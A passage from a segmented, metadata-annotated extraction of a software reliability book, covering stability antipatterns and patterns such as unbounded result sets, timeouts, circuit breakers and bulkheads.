individual jobs’ processing time, the number of instances might be “infinity.” That will smart when the Amazon Web Services bill arrives!\n\nControls and Safeguards\n\nThe United States has a government agency called the Occupational Safety and Health Administration (OSHA). We don’t see them too often in the software field, but we can still learn from their safety advice for robots.10\n\nIndustrial robots have multiple layers of safeguards to prevent damage to people, machines, and facilities. In particular, limiting devices and sensors detect when the robot is not operating in a “normal” condition. For example, suppose a robot arm has a rotating joint. There are limits on how far the arm is allowed to rotate based on the expected operating envelope. These will be much, much smaller than the full range of motion the arm could reach. The rate of rotation will be limited so it doesn’t go flinging car doors across an assembly plant if the grip fails. Some joints even detect if they are not working\n\n10. www.osha.gov/dts/osta/otm/otm_iv/otm_iv_4.html#5\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 84\n\nagainst the expected amount of weight or resistance (as might happen when the front falls off).\n\nWe can implement similar safeguards in our control plane software:\n\nIf observations report that more than 80 percent of the system is unavailable,\n\nit’s more likely to be a problem with the observer than the system.\n\nApply hysteresis. (See Governor, on page 123.) Start machines quickly, but shut them down slowly. Starting new machines is safer than shutting old ones off.\n\nWhen the gap between expected state and observed state is large, signal for confirmation. This is equivalent to a big yellow rotating warning lamp on an industrial robot.\n\nSystems that consume resources should be stateful enough to detect if\n\nthey’re trying to spin up infinity instances.\n\nBuild in deceleration zones to account for momentum. Suppose your control plane senses excess load every second, but it takes five minutes to start a virtual machine to handle the load. It must make sure not to start 300 virtual machines because the high load persists.\n\nRemember This\n\nAsk for help before causing havoc.\n\nInfrastructure management tools can make very large impacts very quickly. Build limiters and safeguards into them so they won’t destroy your whole system at once.\n\nBeware of lag time and momentum.\n\nActions initiated by automation take time. That time is usually longer than a monitoring interval, so make sure to account for some delay in the system’s response to the action.\n\nBeware of illusions and superstitions.\n\nControl systems sense the environment, but they can be fooled. They compute an expected state and a “belief” about the current state. Either can be mistaken.\n\nSlow Responses\n\nAs you saw in Socket-Based Protocols, on page 35, generating a slow response is worse than refusing a connection or returning an error, particularly in the context of middle-layer services.\n\nreport erratum • discuss\n\nSlow Responses • 85\n\nA quick failure allows the calling system to finish processing the transaction rapidly. Whether that is ultimately a success or a failure depends on the application logic. A slow response, on the other hand, ties up resources in the calling system and the called system.\n\nSlow responses usually result from excessive demand. When all available request handlers are already working, there’s no slack to accept new requests. Slow responses can also happen as a symptom of some underlying problem. Memory leaks often manifest via Slow Responses as the virtual machine works harder and harder to reclaim enough space to process a transaction. This will appear as a high CPU utilization, but it is all due to garbage collection, not work on the transactions themselves. I have occasionally seen Slow Responses resulting from network congestion. This is relatively rare inside a LAN but can definitely happen across a WAN—especially if the protocol is too chatty. More frequently, however, I see applications letting their sockets’ send buffers getting drained and their receive buffers filling up, causing a TCP stall. This usually happens in a hand-rolled, low-level socket protocol, in which the read() routine does not loop until the receive buffer is drained.\n\nSlow responses tend to propagate upward from layer to layer in a gradual form of cascading failure.\n\nYou should give your system the ability to monitor its own performance, so it can also tell when it isn’t meeting its service-level agreement. Suppose your system is a service provider that’s required to respond within one hundred milliseconds. When a moving average over the last twenty transactions exceeds one hundred milliseconds, your system could start refusing requests. This could be at the application layer, in which the system would return an error response within the defined protocol. Or it could be at the connection layer, by refusing new socket connections. Of course, any such refusal to provide service must be well documented and expected by the callers. (Since the developers of that system will surely have read this book, they’ll already be prepared for failures, and their system will handle them gracefully.)\n\nRemember This\n\nSlow Responses trigger Cascading Failures.\n\nUpstream systems experiencing Slow Responses will themselves slow down and might be vulnerable to stability problems when the response times exceed their own timeouts.\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 86\n\nFor websites, Slow Responses cause more traffic.\n\nUsers waiting for pages frequently hit the Reload button, generating even more traffic to your already overloaded system.\n\nConsider Fail Fast.\n\nIf your system tracks its own responsiveness, then it can tell when it’s getting slow. Consider sending an immediate error response when the average response time exceeds the system’s allowed time (or at the very least, when the average response time exceeds the caller’s timeout!).\n\nHunt for memory leaks or resource contention.\n\nContention for an inadequate supply of database connections produces Slow Responses. Slow Responses also aggravate that contention, leading to a self-reinforcing cycle. Memory leaks cause excessive effort in the garbage collector, resulting in Slow Responses. Inefficient low-level proto- cols can cause network stalls, also resulting in Slow Responses.\n\nUnbounded Result Sets\n\nDesign with skepticism, and you will achieve resilience. Ask, “What can system X do to hurt me?” and then design a way to dodge whatever wrench your supposed ally throws.\n\nIf your application is like most, it probably treats its database server with far too much trust. I’m going to try to convince you that a healthy dose of skep- ticism will help your application dodge a bullet or two.\n\nA common structure in the code goes like this: send a query to the database and then loop over the result set, processing each row. Often, processing a row means adding a new data object to a collection. What happens when the database suddenly returns five million rows instead of the usual hundred or so? Unless your application explicitly limits the number of results it’s willing to process, it can end up exhausting its memory or spinning in a while loop long after the user loses interest.\n\nBlack Monday\n\nHave you ever had a surprising discovery about an old friend? You know, like the most boring guy in the office suddenly tells you he’s into BASE jumping? That happened to me about my favorite commerce server. One day, with no warning, every instance in the farm—more than a hundred individual, load- balanced instances—started behaving badly. It seemed almost random. An instance would be fine, but then a few minutes later it would start using 100 percent of the CPU. Three or four minutes later, it would crash with a HotSpot\n\nreport erratum • discuss\n\nUnbounded Result Sets • 87\n\nmemory error. The operations team was restarting them as fast as they could, but it took a few minutes to start up and preload cache. Sometimes, they would start crashing before they were even finished starting. We could not keep more than 25 percent of our capacity up and running.\n\nImagine (or recall, if you’ve been there) trying to debug a totally novel failure mode while also participating in a 5 a.m. (with no coffee) conference call with about twenty people. Some of them are reporting the current status, some are trying to devise a short-term response to restore service, others are digging into root cause, and some of them are just spreading disinformation.\n\nWe sent a system admin and a network engineer to go looking for denial-of- service attacks. Our DBA reported that the database was healthy but under heavy load. That made sense, because at startup, each instance would issue hundreds of queries to warm up its caches before accepting requests. Some of the instances would crash before they started accepting requests, which told me it was not related to incoming requests. The high CPU condition looked like garbage collection to me, so I told the team I would start looking for memory problems. Sure enough, when I watched the “heap available” on one instance, I saw it heading toward zero. Shortly after it hit zero, the JVM got a HotSpot error.\n\nUsually, when a JVM runs out of memory, it throws an OutOfMemoryError. It crashes only if it is executing some native code that doesn’t check for NULL after calling malloc(). The only native code I knew of was in the type 2 JDBC driver. (For those of you who haven’t delved the esoterica of Java programming, native code means fully compiled instructions for the host processor. Typically, this is C or C++ code in dynamically linked libraries. Calling into native code makes the JVM just as crashy as any C program.) Type 2 drivers use a thin layer of Java to call out to the database vendor’s native API library. Sure enough, dumping the stack showed execution deep inside the database driver.\n\nBut what was the server doing with the database? For that, I asked our DBA to trace queries from the application servers. Soon enough, we had another instance crash, so we could see what a doomed server did before it went into the twilight zone. The queries all looked totally innocuous, though. Routine stuff. I didn’t see any of the hand-coded SQL monsters that I’d seen elsewhere (eight-way unions with five joins in each subquery, and so on). The last query I saw was just hitting a message table that the server used for its database- backed implementation of JMS. The instances mainly used it to tell each other when to flush their caches. This table should never have more than 1,000 rows, but our DBA saw that it topped the list of most expensive queries.\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 88\n\nFor some reason, that usually tiny table had more than ten million rows. Because the app server was written to just select all the rows from the table, each instance would try to receive all ten-million-plus messages. This put a lock on the rows, since the app server issued a “select for update” query. As it tried to make objects out of the messages, it would use up all available memory, eventually crashing. Once the app server crashed, the database would roll back the transaction, releasing the lock. Then the next app server would step off the cliff by querying the table. We did an extraordinary amount of hand-holding and manual work to compensate for the lack of a LIMIT clause on the app server’s query. By the time we had stabilized the system, Black Monday was done…it was Tuesday.\n\nWe did eventually find out why the table had more than ten million messages in it, but that’s a different story.\n\nThis failure mode can occur when querying databases or calling services. It can also occur when front-end applications call APIs. Because datasets in development tend to be small, the application developers may never experience negative outcomes. After a system is in production for a year, however, even a traversal such as “fetch customer’s orders” can return huge result sets. When that happens, you are treating your best, most loyal customers to the very worst performance!\n\nIn the abstract, an unbounded result set occurs when the caller allows the other system to dictate terms. It’s a failure in handshaking. In any API or pro- tocol, the caller should always indicate how much of a response it’s prepared to accept. TCP does this in the “window” header field. Search engine APIs allow the caller to specify how many results to return and what the starting offset should be. There’s no standard SQL syntax to specify result set limits. ORMs support query parameters that can limit results returned from a query but do not usually limit results when following an association (such as container to contents). Therefore, beware of any relationship that can accumulate unlimited children, such as orders to order lines or user profiles to site visits. Entities that keep an audit trail of changes are also suspect.\n\nBeware of the way that patterns of relationships can change from QA to pro- duction as well. Early social media sites assumed that the number of connec- tions per user would be distributed on something like a bell curve. In fact it’s a power law distribution, which behaves totally differently. If you test with bell-curve distributed relationships, you would never expect to load an entity that has a million times more relationships than the average. But that’s guaranteed to happen with a power law.\n\nreport erratum • discuss",
      "page_number": 91,
      "chapter_number": 12,
      "summary": "This chapter covers segment 12 (pages 91-98). Key topics include service, time, and load. Every single one needs to connect to a database and load some amount of reference or seed data.",
      "keywords": [
        "Slow Responses",
        "system",
        "service",
        "slow",
        "nodes service",
        "Responses",
        "load",
        "state",
        "service Amany nodes",
        "nodes service Bmany",
        "time",
        "nodes",
        "report erratum",
        "report",
        "service discovery systems"
      ],
      "concepts": [
        "service",
        "time",
        "load",
        "slow",
        "starts",
        "responsible",
        "response",
        "report",
        "failure",
        "nodes"
      ],
      "similar_chapters": [
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 58,
          "title": "Segment 58 (pages 575-582)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 60,
          "title": "Segment 60 (pages 591-598)",
          "relevance_score": 0.64,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 2,
          "title": "Segment 2 (pages 9-17)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 3",
          "chapter": 15,
          "title": "Segment 15 (pages 146-155)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        },
        {
          "book": "Generative AI with LangChain_2e",
          "chapter": 31,
          "title": "Segment 31 (pages 262-269)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 13,
      "title": "Segment 13 (pages 99-106)",
      "start_page": 99,
      "end_page": 106,
      "detection_method": "topic_boundary",
      "content": "Unbounded Result Sets • 89\n\nIf you’re handcrafting your own SQL, use one of these recipes to limit the number of rows to fetch:\n\n-- Microsoft SQL Server SELECT TOP 15 colspec FROM tablespec\n\n-- Oracle (since 8i) SELECT colspec FROM tablespec WHERE rownum <= 15\n\n-- MySQL and PostgreSQL SELECT colspec FROM tablespec LIMIT 15\n\nAn incomplete solution (but better than nothing) would be to query for the full results but break out of the processing loop after reaching the maximum number of rows. Although this does provide some added stability on the application server, it does so at the expense of wasted database capacity.\n\nUnbounded result sets are a common cause of slow responses. They can result from violation of steady state (see Steady State, on page 101).\n\nRemember This\n\nUse realistic data volumes.\n\nTypical development and test data sets are too small to exhibit this problem. You need production-sized data sets to see what happens when your query returns a million rows that you turn into objects. As a side benefit, you’ll also get better information from your performance testing when you use production-sized test data.\n\nPaginate at the front end.\n\nBuild pagination details into your service call. The request should include a parameter for the first item and the count. The reply should indicate (roughly) how many results there are.\n\nDon’t rely on the data producers.\n\nEven if you think a query will never have more than a handful of results, beware: it could change without warning because of some other part of the system. The only sensible numbers are “zero,” “one,” and “lots,” so unless your query selects exactly one row, it has the potential to return too many. Don’t rely on the data producers to create a limited amount of data. Sooner or later, they’ll go berserk and fill up a table for no reason, and then where will you be?\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 90\n\nPut limits into other application-level protocols.\n\nService calls, RMI, DCOM, XML-RPC, and any other kind of request/reply call are vulnerable to returning huge collections of objects, thereby con- suming too much memory.\n\nWrapping Up\n\nWe’ve covered a lot of dark territory in this chapter. We’ve looked at many different ways your systems are under threat, both internally and externally. These antipatterns are found in nearly every service and application. Good news! It’s time to emerge from this vale of shadows into the light. It’s time to talk about the stability patterns you can apply to protect your software.\n\nreport erratum • discuss\n\nCHAPTER 5\n\nStability Patterns\n\nWe have traveled through the vale of shadows. Now it is time to come in to the light. In the last chapter, we saw the antipatterns to avoid. In this chapter, we’ll look at the flip side and examine some patterns that are the inverse of the killers from the last chapter. These healthy patterns provide the architec- ture and design guidance to reduce, eliminate, or mitigate the effects of cracks in the system. Not one of these will help your software pass QA, but they will help you get a full night’s sleep, or at least an uninterrupted dinner with your family, once your software launches.\n\nDon’t make the mistake of assuming that a system that includes more of these patterns is superior to one with fewer of them. “Count of patterns applied” is never a good quality metric. Instead, I want you to develop a recovery-oriented mind-set. At the risk of sounding like a broken record, I’ll say it again: expect failures. Apply these patterns wisely to reduce the damage done by an individual failure.\n\nTimeouts\n\nIn the early days, networking issues affected only programmers working on low-level software: operating systems, network protocols, remote filesystems, and so on. Today, every system is a distributed system. Every application must grapple with the fundamental nature of networks: networks are fallible. The wire could be broken, some switch or router along the way could be broken, or the computer you are addressing could be broken. Your thermostat can’t talk to your TV because the microwave is on. Even if you’ve already established communication, any of these elements could break at any time. When that happens, your code can’t just wait forever for a response that might never come; sooner or later, it needs to give up. Hope is not a design method.\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 92\n\nThe timeout is a simple mechanism allowing you to stop waiting for an answer once you think it won’t come. I once had a project to port the BSD sockets library to a mainframe-based UNIX environment. I attacked the project with a stack of RFCs and a dusty pile of source code for UNIX System V Release 4. Two issues nagged at me throughout the entire project. First, heavy use of “#ifdef” blocks for different architectures made it look less like a portable operating system than twenty different operating systems intermingled. Sec- ond, the networking code was absolutely riddled with error handling for dif- ferent flavors of timeouts. By the project’s end, I had grown to understand and appreciate the significance of timeouts.\n\nWell-placed timeouts provide fault isolation—a problem in some other service or device does not have to become your problem. Unfortunately, at higher levels of abstraction, further from the dirty world of hardware, good placement of timeouts becomes increasingly rare. Indeed, some high-level APIs have few or no explicit timeout settings. Presumably the designers behind these APIs have never been awakened in the wee hours to recover a crashed system. Many APIs offer both a call with a timeout and a simpler, easier call that blocks forever. It would be better if, instead of overloading a single function, the no-timeout version were labeled “CheckoutAndMaybeKillMySystem.”\n\nCommercial software client libraries are notoriously devoid of timeouts. These libraries often do direct socket calls on behalf of the system. By hiding the socket from your code, they also prevent you from setting vital timeouts.\n\nTimeouts can also be relevant within a single service. Any resource pool can be exhausted. Conventional usage dictates that the calling thread should be blocked until one of the resources is checked in. (See Blocked Threads, on page 62.)\n\nIt’s essential that any resource pool that blocks threads must have a timeout to ensure that calling threads eventually unblock, whether resources become available or not.\n\nAlso beware of language-level synchronization or mutexes. Always use the form that takes a timeout argument.\n\nAn approach to dealing with pervasive timeouts is to organize long-running operations into a set of primitives that you can reuse in many places. For example, suppose you need to check out a database connection from a resource pool, run a query, turn the result set into objects, and then check the database connection back into the pool. At least three points in that interaction could hang indefinitely. Instead of coding that sequence of interactions dozens of places, with all the associated handling of timeouts (not to mention other kinds\n\nreport erratum • discuss\n\nTimeouts • 93\n\nIs All This Clutter Really Necessary?\n\nYou may think, as I did when porting the sockets library, that handling all the possible timeouts creates undue complexity in your code. It certainly adds complexity. You may find that half your code is devoted to error handling instead of providing features. I argue, however, that the essence of aiming for production—instead of aiming for QA—is handling the slings and arrows of outrageous fortune. That error-handling code, if done well, adds resilience. Your users may not thank you for it, because nobody notices when a system doesn’t go down, but you will sleep better at night.\n\nof errors), create a query object (see Patterns of Enterprise Application Architecture [Fow03]) to represent the part of the interaction that changes.\n\nUse a generic gateway to provide the template for connection handling, error handling, query execution, and result processing. That way you only need to get it right in one place, and calling code can provide just the essential logic. Collecting this common interaction pattern into a single class also makes it easier to apply the Circuit Breaker pattern.\n\nMake full use of your platform. Infrastructure services like Amazon API Gateway can handle a lot of the dirty details for you. Language runtimes that use callbacks or reactive programming styles also let you specify timeouts more easily.\n\nTimeouts are often found in the company of retries. Under the philosophy of “best effort,” the software attempts to repeat an operation that timed out. Immediately retrying an operation after a failure has a number of conse- quences, but only some of them are beneficial. If the operation failed because of any significant problem, it’s likely to fail again if retried immediately. Some kinds of transient failures might be overcome with a retry (for example, dropped packets over a WAN). Within the walls of a data center, however, the failure is probably because of something wrong with the other end of a connection. My experience has been that problems on the network, or with other servers, tend to last for a while. Thus, fast retries are very likely to fail again.\n\nFrom the client’s perspective, making me wait longer is a very bad thing. If you cannot complete an operation because of some timeout, it is better for you to return a result. It can be a failure, a success, or a note that you’ve queued the work for later execution (if I should care about the distinction). In any case, just come back with an answer. Making me wait while you retry the operation might push your response time past my timeout. It certainly keeps my resources busy longer than needed.\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 94\n\nOn the other hand, queuing the work for a slow retry later is a good thing, making the system more robust. Imagine if every mail server between the sender and receiver had to be online, ready to process your mail, and had to respond within sixty seconds in order for email to make it through. How well would the global email system scale? The store-and-forward approach obvi- ously makes much more sense. In the case of failure in a remote server, queue-and-retry ensures that once the remote server is healthy again, the overall system will recover. Work does not need to be lost completely just because part of the larger system isn’t functioning. How fast is fast enough? It depends on your application and your users. For a service behind a web API, “fast enough” is probably between 10 and 100 milliseconds. Beyond that, you’ll start to lose capacity and customers.\n\nTimeouts have natural synergy with circuit breakers. A circuit breaker can tabulate timeouts, tripping to the “off” state if too many occur.\n\nThe Timeouts pattern and the Fail Fast pattern (which I discus in Fail Fast, on page 106) both address latency problems. The Timeouts pattern is useful when you need to protect your system from someone else’s failure. Fail Fast is useful when you need to report why you won’t be able to process some transaction. Fail Fast applies to incoming requests, whereas the Timeouts pattern applies primarily to outbound requests. They’re two sides of the same coin.\n\nTimeouts can also help with unbounded result sets by preventing the client from processing the entire result set, but they aren’t the most effective approach to that particular problem. They’d be a stopgap, but not much more than that.\n\nTimeouts apply to a general class of problems. As such, they help systems recover from unanticipated events.\n\nRemember This\n\nApply Timeouts to Integration Points, Blocked Threads, and Slow Responses. The Timeouts pattern prevents calls to Integration Points from becoming Blocked Threads. Thus, timeouts avert Cascading Failures.\n\nApply Timeouts to recover from unexpected failures.\n\nWhen an operation is taking too long, sometimes we don’t care why…we just need to give up and keep moving. The Timeouts pattern lets us do that.\n\nConsider delayed retries.\n\nMost of the explanations for a timeout involve problems in the network or the remote system that won’t be resolved right away. Immediate retries\n\nreport erratum • discuss\n\nCircuit Breaker • 95\n\nare liable to hit the same problem and result in another timeout. That just makes the user wait even longer for her error message. Most of the time, you should queue the operation and retry it later.\n\nCircuit Breaker\n\nNot too long ago, when electrical wiring was first being built into houses, many people fell victim to physics. The unfortunates would plug too many appliances into their circuit. Each appliance drew a certain amount of cur- rent. When current is resisted, it produces heat proportional to the square ). Because houses lacked supercon- of the current times the resistance ( ducting home wiring, this hidden coupling between electronic gizmos made the wires in the walls get hot, sometimes hot enough to catch fire. Whoosh. No more house.\n\nI2R\n\nThe fledgling energy industry found a partial solution to the problem of resistive heating in the form of fuses. The entire purpose of an electrical fuse is to burn up before the house does. It’s a component designed to fail first, thereby controlling the overall failure mode. This brilliant device worked well, except for two flaws. First, a fuse is a disposable, one-time use item; therefore, it’s possible to run out of them. Second, residential fuses (in the United States) were about the same diameter as copper pennies. Together, these two flaws led many people to conduct experiments with homemade, high-current, low-resistance fuses (that is, a 3/4-inch disk of copper). Whoosh. No more house.\n\nResidential fuses have gone the way of the rotary dial telephone. Now, circuit breakers protect overeager gadget hounds from burning their houses down. The principle is the same: detect excess usage, fail first, and open the circuit. More abstractly, the circuit breaker exists to allow one subsystem (an electrical circuit) to fail (excessive current draw, possibly from a short circuit) without destroying the entire system (the house). Furthermore, once the danger has passed, the circuit breaker can be reset to restore full function to the system.\n\nYou can apply the same technique to software by wrapping dangerous opera- tions with a component that can circumvent calls when the system is not healthy. This differs from retries, in that circuit breakers exist to prevent operations rather than reexecute them.\n\nIn the normal “closed” state, the circuit breaker executes operations as usual. These can be calls out to another system, or they can be internal operations that are subject to timeout or other execution failure. If the call succeeds, nothing extraordinary happens. If it fails, however, the circuit breaker makes\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 96\n\na note of the failure. Once the number of failures (or the frequency of failures, in more sophisticated cases) exceeds a threshold, the circuit breaker trips and “opens” the circuit, as shown in the following figure.\n\nClosedon call / pass throughcall succeeds / reset countcall fails / count failurethreshold reached / trip breaker\n\nOpenon call / failon timeout / attempt reset\n\ntripbreaker\n\nHalf-Openon call/pass throughcall succeeds/resetcall fails/trip breaker\n\nattemptreset\n\nreset\n\ntripbreaker\n\nWhen the circuit is “open,” calls to the circuit breaker fail immediately, without any attempt to execute the real operation. After a suitable amount of time, the circuit breaker decides that the operation has a chance of suc- ceeding, so it goes into the “half-open” state. In this state, the next call to the circuit breaker is allowed to execute the dangerous operation. Should the call succeed, the circuit breaker resets and returns to the “closed” state, ready for more routine operation. If this trial call fails, however, the circuit breaker returns to the open state until another timeout elapses.\n\nDepending on the details of the system, the circuit breaker may track different types of failures separately. For example, you may choose to have a lower threshold for “timeout calling remote system” failures than “connection refused” errors.\n\nWhen the circuit breaker is open, something has to be done with the calls that come in. The easiest answer would be for the calls to immediately fail, perhaps by throwing an exception (preferably a different exception than an ordinary timeout so that the caller can provide useful feedback). A circuit breaker may also have a “fallback” strategy. Perhaps it returns the last good response or a cached value. It may return a generic answer rather than a personalized one. Or it may even call a secondary service when the primary is not available.\n\nreport erratum • discuss",
      "page_number": 99,
      "chapter_number": 13,
      "summary": "This chapter covers segment 13 (pages 99-106). Key topics include queries, query, and server. Our DBA reported that the database was healthy but under heavy load.",
      "keywords": [
        "Timeouts",
        "Timeouts pattern",
        "system",
        "Unbounded Result Sets",
        "Result Sets",
        "Result",
        "server",
        "n’t",
        "patterns",
        "code",
        "query",
        "report erratum",
        "stability patterns",
        "Unbounded Result",
        "fast"
      ],
      "concepts": [
        "queries",
        "query",
        "server",
        "patterns",
        "failure",
        "api",
        "apis",
        "code",
        "coding",
        "data"
      ],
      "similar_chapters": [
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 60,
          "title": "Segment 60 (pages 591-598)",
          "relevance_score": 0.65,
          "method": "sentence_transformers"
        },
        {
          "book": "AI Engineering Building Applications",
          "chapter": 26,
          "title": "Segment 26 (pages 518-535)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 58,
          "title": "Segment 58 (pages 575-582)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 29,
          "title": "Segment 29 (pages 272-282)",
          "relevance_score": 0.59,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 62,
          "title": "Segment 62 (pages 607-613)",
          "relevance_score": 0.59,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 14,
      "title": "Segment 14 (pages 107-114)",
      "start_page": 107,
      "end_page": 114,
      "detection_method": "topic_boundary",
      "content": "Circuit Breaker • 97\n\nCircuit breakers are a way to automatically degrade functionality when the system is under stress. No matter the fallback strategy, it can have an impact on the business of the system. Therefore, it’s essential to involve the system’s stakeholders when deciding how to handle calls made when the circuit is open. For example, should a retail system accept an order if it can’t confirm availabil- ity of the customer’s items? What about if it can’t verify the customer’s credit card or shipping address? Of course, this conversation is not unique to the use of a circuit breaker, but discussing the circuit breaker can be a more effective way of broaching the topic than asking for a requirements document.\n\nThere are some interesting implementation details to consider. For one thing, what constitutes “too many failures”? A simple counter adding up all the faults probably isn’t that interesting. There’s a world of difference between observing five faults spread evenly over five hours versus five faults in the last thirty seconds. We’re usually more interested in the fault density than the total count. I like the Leaky Bucket pattern from Pattern Languages of Program Design 2 [VCK96]. It’s a simple counter that you can increment every time you observe a fault. In the background, a thread or timer decrements the counter periodically (down to zero, of course.) If the count exceeds a threshold, then you know that faults are arriving quickly.\n\nThe state of the circuit breakers in a system is important to another set of stakeholders: operations. Changes in a circuit breaker’s state should always be logged, and the current state should be exposed for querying and monitor- ing. In fact, the frequency of state changes is a useful metric to chart over time; it is a leading indicator of problems elsewhere in the enterprise. Likewise, Operations needs some way to directly trip or reset the circuit breaker. The circuit breaker is also a convenient place to gather metrics about call volumes and response times.\n\nA circuit breaker should be built at the scope of a single process. That is, the same circuit breaker state affects every thread in a process but is not shared across multiple processes. That does mean some loss of efficiency when multiple instances of the caller each independently discover that the provider is down. However, sharing the circuit breaker state introduces another out- of-process communication. That means the safety mechanism would introduce a new failure mode!\n\nEven when just shared within a process, circuit breakers are subject to the gallery of multithreaded programming terrors. Be sure to avoid accidentally single-threading all calls to a remote system! Open source circuit breaker libraries are available for every language and framework, so it’s probably better to start with one of those.\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 98\n\nCircuit breakers are effective at guarding against integration points, cascading failures, unbalanced capacities, and slow responses. They work so closely with timeouts that they often track timeout failures separately from execution failures.\n\nRemember This\n\nDon’t do it if it hurts.\n\nCircuit Breaker is the fundamental pattern for protecting your system from all manner of Integration Points problems. When there’s a difficulty with Integration Points, stop calling it!\n\nUse together with Timeouts.\n\nCircuit Breaker is good at avoiding calls when Integration Points has a problem. The Timeouts pattern indicates that there’s a problem in Inte- gration Points.\n\nExpose, track, and report state changes.\n\nPopping a Circuit Breaker always indicates something abnormal. It should be visible to Operations. It should be reported, recorded, trended, and correlated.\n\nBulkheads\n\nIn a ship, bulkheads are partitions that, when sealed, divide the ship into separate, watertight compartments. With hatches closed, a bulkhead prevents water from moving from one section to another. In this way, a single penetra- tion of the hull does not irrevocably sink the ship. The bulkhead enforces a principle of damage containment.\n\nYou can employ the same technique. By partitioning your systems, you can keep a failure in one part of the system from destroying everything. Physical redundancy is the most common form of bulkheads. If there are four indepen- dent servers, then a hardware failure in one can’t affect the others. Likewise, if there are two application instances running on a server and one crashes, the other will still be running (unless, of course, the first one crashed because of some external influence that would also affect the second).\n\nRedundant virtual machines are not quite as robust as redundant physical machines. Most VM provisioning tools do not allow you to enforce physical iso- lation, so more than one VM may end up running on the same physical box.\n\nAt the largest scale, a mission-critical service might be implemented as sev- eral independent farms of servers, with certain farms reserved for use by critical applications and others available for noncritical uses. For example,\n\nreport erratum • discuss\n\nBulkheads • 99\n\na ticketing system could provide dedicated servers for customer check-in. These would not be affected if other, shared servers are overwhelmed with “flight status” queries (as sometimes happens during severe weather). Such a partitioning would have allowed the airline in Chapter 2, Case Study: The Exception That Grounded an Airline, on page 9, to keep checking in passengers at airports, even if channel partners could not look up fares for that day’s flights.\n\nIn the cloud, you should run instances in different divisions of the service (e.g., across zones and regions in AWS). These are very large-grained chunks with strong partitioning between them. When using functions as a service, basically every function invocation runs in its own compartment.\n\nIn the figure that follows, Foo and Bar both use the enterprise service Baz. Because both depend on a common service, each system has some vulnera- bility to the other. If Foo suddenly gets crushed under user load, goes rogue because of some defect, or triggers a bug in Baz, Bar—and its users—also suffer. This kind of unseen coupling makes diagnosing problems (particularly performance problems) in Bar very difficult. Scheduling maintenance windows for Baz also requires coordination with both Foo and Bar, and it may be diffi- cult to find a window that works for both clients.\n\nFoo\n\nBar\n\nBaz\n\nAssuming both Foo and Bar are critical systems with strict SLAs, it’d be safer to partition Baz, as shown in this revised figure on page 100. Dedicating some capacity to each critical client removes most of the hidden linkage. They probably still share a database and are, therefore, subject to deadlocks across instances, but that’s another antipattern.\n\nOf course, it would be better to preserve all capabilities. Assuming that failures will occur, however, you must consider how to minimize the damage caused by a failure. It is not an easy effort, and one rule cannot apply in every case. Instead, you must examine the impact to the business of each loss of capability and\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 100\n\nFoo\n\nBar\n\nBaz\n\nBazPool 1\n\nBazPool 2\n\ncross-reference those impacts against the architecture of the systems. The goal is to identify the natural boundaries that let you partition the system in a way that is both technically feasible and financially beneficial. The bound- aries of this partitioning may be aligned with the callers, with functionality, or with the topology of the system.\n\nWith cloud-based systems and software-defined load balancers, bulkheads do not need to be permanent. With a bit of automation, a cluster of VMs can be carved out and the load balancer can direct traffic from a particular con- sumer to that cluster. This is similar to A/B testing, but as a protective measure rather than an experiment. Dynamic partitions can be made and destroyed as traffic patterns change.\n\nAt smaller scales, process binding is an example of partitioning via bulkheads. Binding a process to a core or group of cores ensures that the operating system schedules that process’s threads only on the designated core or cores. Because it reduces the cache bashing that happens when processes migrate from one core to another, process binding is often regarded as a performance tweak. If a process goes berserk and starts using all CPU cycles, it can usually drag down an entire host machine. I’ve seen eight core servers consumed by a single process. If that process is bound to a core, however, it can use all available cycles only on that one core.\n\nYou can partition the threads inside a single process, with separate thread groups dedicated to different functions. For example, it’s often helpful to reserve a pool of request-handling threads for administrative use. That way, even if all request-handling threads on the application server are hung, it can still respond to admin requests—perhaps to collect data for postmortem analysis or a request to shut down.\n\nreport erratum • discuss\n\nSteady State • 101\n\nBulkheads are effective at maintaining service, or partial service, even in the face of failures. They are especially useful in service-oriented architectures, where the loss of a single service could have repercussions throughout the enterprise. In effect, a service inside an SOA represents a single point of failure for the enterprise.\n\nRemember This\n\nSave part of the ship.\n\nThe Bulkheads pattern partitions capacity to preserve partial functional- ity when bad things happen.\n\nPick a useful granularity.\n\nYou can partition thread pools inside an application, CPUs in a server, or servers in a cluster.\n\nConsider Bulkheads particularly with shared services models.\n\nFailures in service-oriented or microservice architectures can propagate very quickly. If your service goes down because of a Chain Reaction, does the entire company come to a halt? Then you’d better put in some Bulkheads.\n\nSteady State\n\nThe third edition of Roget’s Thesaurus offers the following definition for the word fiddling: “To handle something idly, ignorantly, or destructively.” It offers helpful synonyms such as fool, meddle, tamper, tinker, and monkey. Fiddling is often followed by the “ohnosecond”—that very short moment in time during which you realize that you have pressed the wrong key and brought down a server, deleted vital data, or otherwise damaged the peace and harmony of stable operations.\n\nEvery single time a human touches a server is an opportunity for unforced errors. I know of one incident in which an engineer, attempting to be helpful, observed that a server’s root disk mirror was out of sync. He executed a command to “resilver” the mirror, bringing the two disks back into synchro- nization. Unfortunately, he made a typo and synced the good root disk from the new, totally empty drive that had just been 